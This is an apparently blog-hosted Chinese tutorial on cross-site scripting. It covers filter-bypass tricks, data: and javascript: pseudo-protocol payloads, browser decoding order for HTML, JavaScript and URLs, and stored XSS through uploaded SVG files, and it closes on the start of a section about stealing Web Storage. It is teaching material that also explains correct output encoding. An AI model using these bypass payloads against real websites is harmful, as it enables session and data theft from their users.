&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;script&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;onerror&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;alert&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;throw&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;xss&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;script&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;

# throw语句抛出异常(可以自定义)，alert接收异常并弹出
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;url过滤&#34;&gt;url过滤&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;url编码绕过&lt;/li&gt;
&lt;li&gt;ip进制转换绕过&lt;/li&gt;
&lt;li&gt;使用//代替http://&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;# linux环境下才可以
&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;script&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;window&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;location&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;//www.baidu.com&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;script&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;使用中文句号&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;script&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;window&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;location&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;http://www。baidu。com&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;script&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;xss伪协议绕过&#34;&gt;XSS伪协议绕过&lt;/h2&gt;
&lt;p&gt;data伪协议：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTs8L3NjcmlwdD4=
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 156; 
			flex-basis: 376px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/xss/image-20220120172221327.png&#34; data-size=&#34;630x402&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/xss/image-20220120172221327.png&#34;
			width=&#34;630&#34;
			height=&#34;402&#34;
			srcset=&#34;https://coollllllll.github.io/p/xss/image-20220120172221327_hu2461ef4061f3cabc396cb47053bee7bd_55406_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/xss/image-20220120172221327_hu2461ef4061f3cabc396cb47053bee7bd_55406_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;javascript伪协议：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;javascript::alert(&#39;1&#39;)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;例子：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;a href=&amp;quot;javascript:alert(2)&amp;quot;&amp;gt;a&amp;lt;/a&amp;gt;

&amp;lt;object data=&amp;quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgiWHNzVGVzdCIpOzwvc2NyaXB0Pg==&amp;quot;&amp;gt;&amp;lt;/object&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;xss编码绕过&#34;&gt;XSS编码绕过&lt;/h2&gt;
&lt;h3 id=&#34;unicode编码&#34;&gt;Unicode编码&lt;/h3&gt;
&lt;p&gt;Unicode是为了解决传统的字符编码方案的局限而产生的，它为每种语言中的每个字符设定了统一并且唯一的二进制编码，以满足跨语言、跨平台进行文本转换、处理的要求。其使用两个字节表示一个字符。&lt;/p&gt;
&lt;p&gt;Unicode只是一种容纳世界上所有文字和符号的字符编码方案，具体存储实现有UTF-8、UTF-16、UTF-32。&lt;/p&gt;
&lt;p&gt;JavaScript编码：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# 可以使用\uxxxx 来表示一个字符的Unicode编码，例如&#39;haha&#39;：
\u0068\u0061\u0068\u0061
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;HTML实体编码：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# &amp;amp;开头+预先定义的实体名称+;分号结束,例如&#39;&amp;lt;&#39;:
&amp;amp;lt;

# &amp;amp;开头+#符号+字符在ASCII对应的十进制数字+;分号结束，例如&#39;haha&#39;：
&amp;amp;#104;&amp;amp;#97;&amp;amp;#104;&amp;amp;#97;
&lt;/code&gt;&lt;/pre&gt;&lt;blockquote&gt;
&lt;p&gt;注：字符都是由实体编号的，但有些字符是没有实体名称的&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;URL编码：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# 以&#39;haha&#39;为例：
%68%61%68%61
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;浏览器解码规则&#34;&gt;浏览器解码规则&lt;/h3&gt;
&lt;p&gt;编码方式有HTML实体编码、JS编码、URL编码，当浏览器解析HTML文档时又该以什什么样的方式和顺序对其进行解码呢？&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;当浏览器接收到HTML文档时，通过HTML解析器将HTML文档解析为DOM树，这一过程中完成HTML实体解码；在DOM树创建过程中，如果遇到js或css相关的标签，则会触发JavaScript和CSS解释器完成内联脚本的解析，这一过程完成JS的解码；如果浏览器发现存在URL环境，则也会引入URL解析器完成对URL的解码工作，URL解码顺序会根据URL所在位置不同(可能在JJS解析器之前或之后)而有所区别。但HTML解析总是最先进行。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;html解析过程&#34;&gt;HTML解析过程&lt;/h3&gt;
&lt;p&gt;HTML有五类元素：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;空元素(Void elements)，如：area、base、br、col、command、embed、hr、img、input、keygen、link、meta、param、source、track、wbr等&lt;/li&gt;
&lt;li&gt;原始文本元素(Raw text elements)，如：&amp;lt;script&amp;gt;和&amp;lt;style&amp;gt;&lt;/li&gt;
&lt;li&gt;RCDATA元素(RCDATA elements)，如：&amp;lt;textarea&amp;gt;和&amp;lt;title&amp;gt;&lt;/li&gt;
&lt;li&gt;外部元素(Foreign elements)，如：MathML命名空间或者SVG命名空间的元素&lt;/li&gt;
&lt;li&gt;基本元素(Normal elements)，即除了以上4种元素以外的元素&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;五类元素的区别：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;空元素：不能容纳任何内容（因为它们没有闭合标签，没有内容能够放在开始标签和闭合标签中间）。&lt;/li&gt;
&lt;li&gt;原始文本元素：可以容纳文本。&lt;/li&gt;
&lt;li&gt;RCDATA元素：可以容纳文本和字符引用。&lt;/li&gt;
&lt;li&gt;外部元素：可以容纳文本、字符引用、CDATA段、其他元素和注释&lt;/li&gt;
&lt;li&gt;基本元素：可以容纳文本、字符引用、其他元素和注释&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;HTML解析器从文档输入流中消耗字符并根据转换规则转变至不同状态(以状态机的方式运行)：&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 173; 
			flex-basis: 416px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/xss/image-20220121102112625.png&#34; data-size=&#34;564x325&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/xss/image-20220121102112625.png&#34;
			width=&#34;564&#34;
			height=&#34;325&#34;
			srcset=&#34;https://coollllllll.github.io/p/xss/image-20220121102112625_hu137e3ab169aed5bbd5bd590b0cdd9b46_54228_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/xss/image-20220121102112625_hu137e3ab169aed5bbd5bd590b0cdd9b46_54228_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;引入示例：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;html&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
 &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;body&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
   hello,cool!
 &lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;body&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;html&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;解析过程：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;初始状态为&lt;strong&gt;Data&lt;/strong&gt; state，当消耗了&lt;code&gt;&amp;lt;&lt;/code&gt;字符，状态转为&lt;strong&gt;Tag open&lt;/strong&gt; state，消耗一个a-z的字符产生一个开始标签符号，状态转为&lt;strong&gt;Tag name&lt;/strong&gt; state，保持该状态直到消耗至&lt;code&gt;&amp;gt;&lt;/code&gt;字符，当中所消耗的每个字符都附加至这个符号名，例子中创建了&lt;code&gt;html&lt;/code&gt;符号。&lt;/li&gt;
&lt;li&gt;当消耗到&lt;code&gt;z&lt;/code&gt;，当前符号完成，此时状态转回&lt;strong&gt;Data&lt;/strong&gt; state，&lt;code&gt;&amp;lt;body&amp;gt;&lt;/code&gt;重复这一处理过程。此时，html和body标签已经识别出来，当前状态已回到&lt;strong&gt;Data&lt;/strong&gt; state，消耗&lt;code&gt;hello,cool!&lt;/code&gt;中的字符&lt;code&gt;h&lt;/code&gt;并创建一个字符符号，这个过程会为&lt;code&gt;hello,cool!&lt;/code&gt;中的每个字符都生成一个字符符号。&lt;/li&gt;
&lt;li&gt;直到遇到&lt;code&gt;&amp;lt;/body&amp;gt;&lt;/code&gt;中的&lt;code&gt;&amp;lt;&lt;/code&gt;，进入&lt;strong&gt;Tag open&lt;/strong&gt; state，消耗下一个字符&lt;code&gt;/&lt;/code&gt;将创建一个闭合标签符号，状态转为&lt;strong&gt;Close tag open&lt;/strong&gt; state，继续消耗字符，此时状态已转为&lt;strong&gt;Tag name&lt;/strong&gt; state，保持该状态直到遇到&lt;code&gt;&amp;gt;&lt;/code&gt;。产生了一个新的标签符号并回到&lt;strong&gt;Data&lt;/strong&gt; state。此后的闭合标签处理同上。&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;注：&lt;/p&gt;
&lt;p&gt;HTML解析器处于数据状态（Data state）、RCDATA 状态（RCDATA state）、属性值状态（Attribute Value state）时，字符实体会被解码为对应的字符。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;示例：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;div&amp;gt;&amp;amp;#60;img src=x onerror=alert(4)&amp;amp;#62;&amp;lt;/div&amp;gt;

&amp;lt; 和 &amp;gt; 被编码为字符实体&amp;amp;#60; 和 &amp;amp;#62;。
当HTML解析器解析完&amp;lt;div&amp;gt;时，会进入数据状态（Data State）并发布标签令牌。接着解析到实体&amp;amp;#60;时，因为处在数据状态Data State，所以就会对实体进行解码为&amp;lt;，后面的&amp;amp;#62;同样道理被解码为&amp;gt;。
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;在上述过程中当字符实体进行解码后只被视为字符引用，解析器在使用字符引用后不会转换到标签打开状态（&lt;strong&gt;Tag Open&lt;/strong&gt; State），不进入标签打开状态就不会被发布为HTML标签。因此，&lt;strong&gt;img不会创建新HTML标签&lt;/strong&gt;，只会将其作为数据来处理。&lt;strong&gt;这就是使用字符实体来避免用户不安全输入导致XSS的原因。&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;特殊情况&#34;&gt;特殊情况&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;原始文本元素&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;HTML中Raw text elements的标签有两个：script、style。在原始文本类型标签下的所有内容块都属于该标签。&lt;/p&gt;
&lt;p&gt;Raw text elements类型标签下的所有字符实体编码都不会被HTML解码。HTML解析器解析到script、style标签的内容块（数据）部分时，状态会进入&lt;strong&gt;Script Data&lt;/strong&gt; state，该状态并不在前面说的会解码字符实体的三个状态之中。&lt;/p&gt;
&lt;p&gt;因此，该例子：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;script&amp;gt;&amp;amp;#97;&amp;amp;#108;&amp;amp;#101;&amp;amp;#114;&amp;amp;#116;&amp;amp;#40;&amp;amp;#57;&amp;amp;#41;&amp;amp;#59&amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;中字符实体并不会被解码，也就不会执行JS。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;RCDATA&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;HTML中 RCDATA 的标签有两个：textarea、title。解析器解析到 textarea、title 标签的数据部分时，状态会进入 &lt;strong&gt;RCDATA&lt;/strong&gt; State。处于 &lt;strong&gt;RCDATA&lt;/strong&gt; State 状态时，字符实体是会被解析器解码的。&lt;/p&gt;
&lt;p&gt;示例：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;textarea&amp;gt;&amp;amp;#60;script&amp;amp;#62;alert(5)&amp;amp;#60;/script&amp;amp;#62;&amp;lt;/textarea&amp;gt;

&amp;lt;和&amp;gt;被编码为实体&amp;amp;#60;和&amp;amp;#62;。
里面的JS同样还是不会被执行，还是因为解码字符实体状态机不会进入标签打开状态(Tag Open State)，因此里面的&amp;lt;script&amp;gt;并不会被解析为HTML标签，也就不会被执行
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;javascript解析&#34;&gt;JavaScript解析&lt;/h3&gt;
&lt;p&gt;形如&lt;code&gt; \uXXXX&lt;/code&gt; 这样的 Unicode 字符转义序列或 Hex 编码是否能被解码需要看情况。&lt;/p&gt;
&lt;p&gt;JavaScript中有三个地方可以出现Unicode字符转义序列：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;字符串中&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Unicode转义序列出现在字符串中时，它只会被解释为普通字符，而不会破坏字符串的上下文。&lt;/p&gt;
&lt;p&gt;例如，&lt;code&gt;&amp;lt;script&amp;gt;alert(&amp;quot;\u0031\u0030&amp;quot;);&amp;lt;/script&amp;gt;&lt;/code&gt;，被编码转义的部分为10，会被正常解码，JS代码也就会被执行。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;标识符中&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;若Unicode转义序列存在于标识符中，即变量名、函数名等，它会被进行解码。&lt;/p&gt;
&lt;p&gt;例如，&lt;code&gt;&amp;lt;script&amp;gt;\u0061\u006c\u0065\u0072\u0074(10);&amp;lt;/script&amp;gt;&lt;/code&gt;，被编码转义的部分为alert字符，属于在标识符中的情况，因此会被正常解码，JS代码也会被执行。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;控制字符&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;若Unicode转义序列存在于控制字符中，那么它会被解码但不会被解释为控制字符，而会被解释为标识符或字符串字符的一部分。控制字符即&lt;code&gt;&#39;&lt;/code&gt;、&lt;code&gt;&amp;quot;&lt;/code&gt;、&lt;code&gt;(&lt;/code&gt;、&lt;code&gt;)&lt;/code&gt;等。&lt;/p&gt;
&lt;p&gt;例如，&lt;code&gt;&amp;lt;script&amp;gt;alert\u0028&amp;quot;xss&amp;quot;); &amp;lt;/script&amp;gt;&lt;/code&gt;，&lt;code&gt;(&lt;/code&gt;进行了Unicode编码，那么解码后它不再是作为控制字符，而是作为标识符的一部分，即&lt;code&gt;alert(&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;因此函数的括号之类的控制字符进行Unicode转义后是不能被正常解释的。&lt;/p&gt;
&lt;p&gt;示例：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;script&amp;gt;\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0031\u0029&amp;lt;/script&amp;gt;

被编码部分为alert(11)。
该例中的JS不会被执行，因为控制字符被编码了。
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;示例：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;script&amp;gt;\u0061\u006c\u0065\u0072\u0074(\u0031\u0032)&amp;lt;/script&amp;gt;

被编码部分为alert及括号内的12。
该例中JS不会被执行，原因在于括号内被编码的部分不能被正常解释。要么使用ASCII码数字，要么加双引号或单引号使其变为字符串(就可以被解码)，作为字符串也只能作为普通字符。
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;示例：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;script&amp;gt;alert(&#39;13\u0027)&amp;lt;/script&amp;gt;

被编码处为&#39;。
该例的JS不会执行，因为控制字符被编码了，解码后的&#39;将变为字符串的一部分，而不再解释为控制字符。因此该例中字符串是不完整的，没有&#39;来结束字符串。
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;示例：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;script&amp;gt;alert(&#39;14\u000a&#39;)&amp;lt;/script&amp;gt;

该例的JS会被执行，因为被编码的部分处于字符串内，只会被解释为普通字符，不会突破字符串上下文。
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;示例：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;img src = &amp;quot;https://text.com&amp;quot; onclick = &#39;alert(&amp;quot;输入点&amp;quot;)&#39;&amp;gt;

开发人员单纯设置HTML实体编码为防御xss的手段，但是用户输入点在alert中
如果用户正常输入的话凡是存在&amp;lt; ,&amp;quot; 等都能被转码，攻击者可以通过语句 &amp;quot;);alert(&amp;quot;test，在服务端被编码：
&amp;lt;img src = &amp;quot;https://gss1.bdstatic.com&amp;quot; onclick = &#39;alert(&amp;quot;FIRST XSS&amp;amp;#34;&amp;amp;#41;&amp;amp;#59;&amp;amp;#97;&amp;amp;#108;&amp;amp;#101;&amp;amp;#114;&amp;amp;#116;&amp;amp;#40;&amp;amp;#34;&amp;amp;#116;&amp;amp;#101;&amp;amp;#115;&amp;amp;#116;&amp;quot;)&#39;&amp;gt; 
解码后弹窗两次，是因为浏览器进行HTML解码发现存在两个alert()

对于这种情况，正确防御XSS的方法：应该是先JavaScript编码然后再进行HTML编码
用户输入 &amp;quot;);alert(&amp;quot;test 后在服务端先JavaScript编码然后再进行HTML编码，在
在浏览器端：首先经过第一步HTML解码后变为\u0022\u0029\u003B\u0061\u006C\u0065\u0072\u0074\u0028\u0022\u0074\u0065\u0073\u0074，JavaScript解析器工作，变为 &amp;quot;);alert(&amp;quot;test ，而JavaScript解析时只有标识符名称不会被当做字符串，控制字符仅会被解析为标示符名称或者字符串，因此\u0022被解释成双引号文本，\u0028和\u0029被解释成为圆括号文本，不会变为控制字符被解析执行。在这里采用的先JS编码后HTML编码中只弹窗了一次。
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;url解析&#34;&gt;URL解析&lt;/h3&gt;
&lt;p&gt;URL解析器也被建模为状态机，文档输入流中的字符可以将其导向不同的状态。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;URL的Scheme部分（协议部分）必须为ASCII字符，即不能被任何编码，否则URL解析器的状态机将进入No Scheme状态。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;示例：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;a href=&amp;quot;%6a%61%76%61%73%63%72%69%70%74:%61%6c%65%72%74%28%31%29&amp;quot;&amp;gt;&amp;lt;/a&amp;gt;

URL编码部分的是javascript:alert(1)。

JS不会被执行，因为作为Scheme部分的&amp;quot;javascript&amp;quot;这个字符串被编码，导致URL解析器状态机进入No Scheme状态。
&lt;/code&gt;&lt;/pre&gt;&lt;blockquote&gt;
&lt;p&gt;URL中的&lt;code&gt;:&lt;/code&gt;也不能被以任何方式编码，否则URL解析器的状态机也将进入No Scheme状态。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;示例：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;a href=&amp;quot;javascript%3aalert(3)&amp;quot;&amp;gt;&amp;lt;/a&amp;gt;

由于:被URL编码为%3a，导致URL状态机进入No Scheme状态，JS代码不能执行。
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;示例：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;a href=&amp;quot;&amp;amp;#x6a;&amp;amp;#x61;&amp;amp;#x76;&amp;amp;#x61;&amp;amp;#x73;&amp;amp;#x63;&amp;amp;#x72;&amp;amp;#x69;&amp;amp;#x70;&amp;amp;#x74;:%61%6c%65%72%74%28%32%29&amp;quot;&amp;gt;

&amp;quot;javascript&amp;quot;这个字符串被实体化编码，:没有被编码，alert(2)被URL编码。

成功执行。首先，HTML状态机处于属性值状态(Attribute Value State)时，字符实体时会被解码的，此处在href属性中，所以被实体化编码的&amp;quot;javascript&amp;quot;字符串会被解码。

其次，HTML解析是在URL解析之前的，所以在进行URL解析之前，Scheme部分的&amp;quot;javascript&amp;quot;字符串已被解码，而并不再是被实体编码的状态。
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;解析顺序示例&#34;&gt;解析顺序示例&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;示例：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;a href=&amp;quot;UserInput&amp;quot;&amp;gt;&amp;lt;/a&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;该例子中，首先由 HTML 解析器对 UserInput 部分进行字符实体解码；接着 URL 解析器对 UserInput 进行 URL decode；如果 URL 的 Scheme 部分为 javascript 的话，JavaScript 解析器会再对 UserInput 进行解码。&lt;/p&gt;
&lt;p&gt;解析顺序：HTML 解析-&amp;gt;URL 解析-&amp;gt;JavaScript 解析&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;示例：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;a href=# onclick=&amp;quot;window.open(&#39;UserInput&#39;)&amp;quot;&amp;gt;&amp;lt;/a&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;该例子中，首先由 HTML 解析器对 UserInput 部分进行字符实体解码；接着由 JavaScript 解析器会再对 onclick 部分的 JS 进行解析并执行 JS；执行 JS 后 window.open(‘UserInput’) 函数的参数会传入 URL，所以再由 URL 解析器对 UserInput 部分进行解码。&lt;/p&gt;
&lt;p&gt;解析顺序：HTML 解析-&amp;gt;JavaScript 解析-&amp;gt;URL 解析&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;示例：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;a href=&amp;quot;javascript:window.open(&#39;UserInput&#39;)&amp;quot;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;该例子中，首先还是由 HTML 解析器对 UserInput 部分进行字符实体解码；接着由 URL 解析器解析 href 的属性值；然后由于 Scheme 为 javascript，所以由 JavaScript 解析；解析执行 JS 后 window.open(‘UserInput’) 函数传入 URL，所以再由 URL 解析器解析。&lt;/p&gt;
&lt;p&gt;解析顺序：HTML 解析-&amp;gt;URL 解析-&amp;gt;JavaScript 解析-&amp;gt;URL 解析。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;xss高阶利用方式&#34;&gt;XSS高阶利用方式&lt;/h2&gt;
&lt;h3 id=&#34;svg下的存储型xss&#34;&gt;SVG下的存储型XSS&lt;/h3&gt;
&lt;p&gt;可缩放矢量图形(Scalable Vector Graphics，SVG)是W3C推出的基于XML的二维矢量图形标准。SVG可以提供高质量的矢量图形渲染，同时由于支持JavaScript和文档对象模型，SVG图形通常具有强大的交互能力。&lt;/p&gt;
&lt;p&gt;例子：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-http&#34; data-lang=&#34;http&#34;&gt;&lt;span class=&#34;err&#34;&gt;&amp;lt;?xml version=&amp;#34;1.0&amp;#34; standalone=&amp;#34;no&amp;#34;?&amp;gt;
&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;lt;svg width=&amp;#34;100%&amp;#34; height=&amp;#34;100%&amp;#34; version=&amp;#34;1.1&amp;#34; xmlns=&amp;#34;http://www.w3.org/2000/svg&amp;#34;&amp;gt;
&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;	&amp;lt;rect width=&amp;#34;100&amp;#34; height=&amp;#34;100&amp;#34; style=&amp;#34;fill:rgb(0,0,255);stroke-width:1;stroke:rgb(0,0,0)&amp;#34; /&amp;gt;
&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;  &amp;lt;script&amp;gt;alert(&amp;#39;xss&amp;#39;);&amp;lt;/script&amp;gt;
&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;lt;/svg&amp;gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;存储型XSS：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# 正常业务
文件上传 -&amp;gt; 上传SVG图片 -&amp;gt; SVG图片存储至服务器

# 利用
嵌入XSS代码 -&amp;gt; 上传该SVG -&amp;gt; 用户访问该图片 -&amp;gt; 执行JS脚本
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;svg下的窃取web-storage&#34;&gt;SVG下的窃取Web Storage&lt;/h3&gt;
&lt;p&gt;Web Storage是HTML5中本地存储的解决方案之一，但并不是为了取代cookie而制定的标准，cookie作为HTTP协议的一部分用来处理客户端和服务器通信是不可或缺的，session正是依赖于cookie实现客户端状态保持。WebStorage的意图在于解决本来不应该cookie做，却不得不用cookie的本地存储。&lt;/p&gt;
&lt;p&gt;cookie的缺陷：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;数据大小：仅有4KB，无法满足复杂的业务需求&lt;/li&gt;
&lt;li&gt;网络传输：cookie会附加在每个HTTP请求中，流量负担&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Web Storage提供两种类型的API：localStorage和sessionStorage。localStorage在本地永久性存储数据，除非显式将其删除或清空，sessionStorage存储的数据只在会话期间有效，关闭浏览器则自动删除。两个对象都有共同的API。&lt;/p&gt;
